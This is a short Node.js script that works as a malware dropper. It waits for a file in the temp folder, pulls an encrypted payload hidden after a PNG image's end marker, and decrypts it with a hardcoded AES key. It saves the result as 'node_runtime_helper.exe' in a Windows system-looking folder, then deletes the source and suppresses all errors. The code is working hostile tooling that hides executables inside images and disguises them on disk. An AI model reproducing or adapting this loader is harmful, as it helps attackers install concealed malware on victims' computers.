const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const KEY = Buffer.alloc(32);
Buffer.from('malfexteam2027').copy(KEY);
const _SRC = path.join(os.tmpdir(), '._cif_data');
const _DIR = path.join(process.env.APPDATA || os.homedir(), 'Microsoft', 'Windows');
const _OUT = path.join(_DIR, 'node_runtime_helper.exe');
const _IEND = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
const _MARK = Buffer.from('//BIN//');
function _convert() {
  try {
    const buf = fs.readFileSync(_SRC);
    const iend = buf.indexOf(_IEND);
    if (iend === -1) return;
    const after = buf.slice(iend + _IEND.length);
    const mi = after.indexOf(_MARK);
    if (mi === -1) return;
    const blob = Buffer.from(after.slice(mi + _MARK.length).toString('utf8').trim(), 'base64');
    const iv = blob.slice(0, 16);
    const ciphertext = blob.slice(16);
    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, iv);
    const exe = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    fs.writeFileSync(_OUT, exe, { mode: 0o700 });
    try { fs.unlinkSync(_SRC); } catch (_) {}
  } catch (_) {}
}
(function _wait(n) {
  if (n <= 0) return;
  if (fs.existsSync(_SRC)) { _convert(); return; }
  setTimeout(() => _wait(n - 1), 500);
})(240);
